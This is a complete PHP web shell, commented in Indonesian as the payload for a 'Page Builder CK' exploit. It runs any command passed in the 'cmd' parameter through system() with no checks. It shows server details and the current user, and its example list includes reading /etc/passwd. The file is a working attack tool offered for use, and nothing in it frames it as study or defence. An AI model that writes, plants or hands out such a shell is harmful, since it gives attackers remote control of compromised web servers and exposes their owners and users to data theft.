<?php
// ============================================================
// SIMPLE PHP SHELL UNTUK PAGE BUILDER CK EXPLOIT
// ============================================================

// Cek apakah ada perintah yang dikirim
$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';

if($cmd) {
    // Tampilkan hasil perintah
    echo "<!DOCTYPE html><html><head><title>Shell</title>";
    echo "<style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}</style>";
    echo "</head><body>";
    echo "<h2>▶ Command: " . htmlspecialchars($cmd) . "</h2>";
    echo "<pre>";
    
    // Eksekusi perintah
    system($cmd . " 2>&1");
    
    echo "</pre>";
    echo "<hr><a href='?'>↩ Back</a>";
    echo "</body></html>";
} else {
    // Tampilan awal
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>PHP Shell</title>
        <style>
            body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:30px}
            input{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px;width:70%;font-size:16px}
            button{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold}
            .info{color:#888;font-size:12px}
        </style>
    </head>
    <body>
        <h1>🔥 PHP Shell Active</h1>
        <div class="info">Server: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?></div>
        <div class="info">PHP: <?= phpversion() ?></div>
        <div class="info">User: <?= exec('whoami') ?></div>
        <div class="info">CWD: <?= getcwd() ?></div>
        <hr>
        <form method="get">
            <input type="text" name="cmd" placeholder="Enter command (e.g. id, ls -la, whoami)" autofocus>
            <button type="submit">▶ Execute</button>
        </form>
        <hr>
        <h3>Examples:</h3>
        <ul>
            <li><code>?cmd=id</code> - Current user</li>
            <li><code>?cmd=ls -la</code> - List files</li>
            <li><code>?cmd=whoami</code> - Username</li>
            <li><code>?cmd=pwd</code> - Current directory</li>
            <li><code>?cmd=cat /etc/passwd</code> - Read file</li>
        </ul>
    </body>
    </html>
    <?php
}
?>
